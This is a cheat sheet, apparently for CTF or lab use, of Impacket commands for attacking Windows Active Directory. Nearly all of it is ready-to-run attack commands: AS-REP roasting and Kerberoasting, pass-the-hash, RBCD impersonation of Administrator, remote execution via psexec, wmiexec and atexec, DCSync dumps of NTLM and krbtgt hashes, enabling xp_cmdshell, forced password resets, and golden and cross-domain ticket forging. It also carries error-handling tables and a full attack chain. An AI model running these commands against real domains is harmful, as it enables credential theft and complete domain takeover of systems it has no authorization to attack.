# Impacket (senior)

The surgical kit. nxc finds; Impacket forges, dumps, and execs.

Binaries on Kali are `impacket-<Name>` (also `Name.py`). Same flags.

## Map

| Job | Tool |
| --- | --- |
| AS-REP | `GetNPUsers` |
| Kerberoast | `GetUserSPNs` |
| TGT / TGS | `getTGT`, `getST` |
| Delegation map | `findDelegation` |
| RID cycle | `lookupsid` |
| PTH / exec | `wmiexec`, `smbexec`, `psexec`, `atexec`, `dcomexec` |
| Dump | `secretsdump`, `Get-GPPPassword` |
| Relay | `ntlmrelayx` (`relay.md`) |
| SQL | `mssqlclient` |
| Tickets | `ticketer`, `raiseChild` |
| Machine account | `addcomputer` |
| Password | `changepasswd` |
| ACL write | `dacledit` |

## Flags that matter

```
# roast (no cred)
impacket-GetNPUsers {{DOMAIN}}/ -no-pass -dc-ip {{DC}} -usersfile /loot/enum/users.txt \
  -format hashcat -outputfile /loot/hashes/asrep.txt

# roast from guest / empty password — do this BEFORE spray when guest binds
impacket-GetUserSPNs {{DOMAIN}}/guest -no-pass -dc-ip {{DC}} -request \
  -outputfile /loot/hashes/kerb.txt
# roast (any user)
impacket-GetUserSPNs {{DOMAIN}}/{{USER}}:'{{PASS}}' -dc-ip {{DC}} -request \
  -outputfile /loot/hashes/kerb.txt
# AES: add -outputfile and expect $krb5tgs$18$ → hashcat 19700

impacket-lookupsid {{DOMAIN}}/nobody@{{DC}} -no-pass          # anonymous RID
impacket-lookupsid {{DOMAIN}}/{{USER}}:'{{PASS}}'@{{DC}}      # trusts / foreign SIDs

impacket-getTGT {{DOMAIN}}/{{USER}}:'{{PASS}}' -dc-ip {{DC}}
# or PTH:
impacket-getTGT {{DOMAIN}}/{{USER}} -hashes :{{HASH}} -dc-ip {{DC}}
export KRB5CCNAME={{USER}}.ccache

impacket-findDelegation {{DOMAIN}}/{{USER}}:'{{PASS}}' -dc-ip {{DC}}

# S4U / RBCD — pick the SPN by the goal:
#   ldap/  → DCSync grant / directory writes as Administrator
#   cifs/  → C$ / file read / atexec
impacket-getST -spn ldap/{{DC_FQDN}} -impersonate Administrator \
  -dc-ip {{DC}} {{DOMAIN}}/{{USER}}:'{{PASS}}'          # {{USER}} is the RBCD principal (may be an existing SPN user)
impacket-getST -spn cifs/{{DC_FQDN}} -impersonate Administrator \
  -dc-ip {{DC}} {{DOMAIN}}/FAKE\$:'LabOnly!1'
export KRB5CCNAME=Administrator@ldap_{{DC_FQDN}}@{{DOMAIN}}.ccache

impacket-wmiexec {{DOMAIN}}/{{USER}}:'{{PASS}}'@HOST
impacket-smbexec {{DOMAIN}}/{{USER}}:'{{PASS}}'@HOST     # no admin share needed sometimes
impacket-psexec {{DOMAIN}}/{{USER}}:'{{PASS}}'@HOST      # noisy, drops a service
# no WinRM (5985 closed)? do NOT reach for evil-winrm. Use SMB:
impacket-smbclient.py -hashes :{{HASH}} {{DOMAIN}}/Administrator@{{DC}}   # then: use C$ / cd Users/... / get flag
impacket-atexec -hashes :{{HASH}} {{DOMAIN}}/Administrator@{{DC}} 'type C:\Users\Administrator\Desktop\flag.txt'
# Kerberos:
impacket-wmiexec -k -no-pass {{DOMAIN}}/{{USER}}@HOST

impacket-secretsdump {{DOMAIN}}/{{USER}}:'{{PASS}}'@{{DC}} -just-dc-ntlm
impacket-secretsdump {{DOMAIN}}/{{USER}}@{{DC}} -hashes :{{HASH}} -just-dc-user krbtgt
impacket-secretsdump {{DOMAIN}}/{{USER}}:'{{PASS}}'@HOST -just-dc-user none   # SAM if admin

impacket-Get-GPPPassword {{DOMAIN}}/{{USER}}:'{{PASS}}'@{{DC}}

impacket-mssqlclient {{DOMAIN}}/{{USER}}:'{{PASS}}'@SQLHOST
# inside: SELECT SYSTEM_USER; SELECT * FROM master..sysservers;
# EXECUTE AS LOGIN = 'sa'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

impacket-changepasswd {{DOMAIN}}/{{USER}}:'{{PASS}}'@{{DC}} -newpass 'LabOnly!1' -user TARGET

impacket-addcomputer {{DOMAIN}}/{{USER}}:'{{PASS}}' -computer-name 'FAKE$' \
  -computer-pass 'LabOnly!1' -dc-ip {{DC}}

impacket-ticketer -nthash {{KRBTGT}} -domain-sid S-1-5-21-… \
  -domain {{DOMAIN}} administrator
# child → parent EA (SID filtering off):
impacket-ticketer -nthash {{KRBTGT_CHILD}} -domain-sid CHILD \
  -domain {{DOMAIN}} -extra-sid PARENT-519 administrator
```

## Read this

- `KDC_ERR_PREAUTH_REQUIRED` on GetNPUsers → not AS-REP, continue.
- `KDC_ERR_S_PRINCIPAL_UNKNOWN` on getST → wrong SPN (use the exact BH / findDelegation value).
- `S_PRINCIPAL_UNKNOWN` on wmiexec -k → `/etc/hosts` + `-dc-ip`, never 8.8.8.8.
- secretsdump `ERROR_DS_DRA_ACCESS_DENIED` / `rpc_s_access_denied` → you are not DA and have no DS-Replication. Back to the graph.
- `STATUS_MORE_PROCESSING_REQUIRED` then hang on psexec → Defender / no SMB admin. Try wmiexec or WinRM.
- mssqlclient login but `dbo` is not `sa` → `EXECUTE AS` / impersonate, then links.

## Fail → next

| Symptom | Next |
| --- | --- |
| clock skew | ntpdate the DC, rebuild the ticket |
| Protected Users | TGT + `-k`. PTH will fail |
| psexec blocked | wmiexec → smbexec → evil-winrm |
| no `C$` | you are not local admin. stay in LDAP |
| GetUserSPNs empty | gMSA (bloodyAD) or no user SPNs. Try `-no-pass` as guest first |
| ticketer ignored | wrong domain SID (lookupsid 500) |
| getST `KDC_ERR_BADOPTION` | RBCD principal has no SPN — use a Kerberoastable user, or add one |
| no WinRM (5985 closed) | `smbclient.py` / `atexec` with the Administrator hash, not evil-winrm |

## Chain

Roast → crack (`crack.md`) → nxc spray that cred → BloodHound → getST / secretsdump.
Never golden-ticket before you have KRBTGT **and** the domain SID.
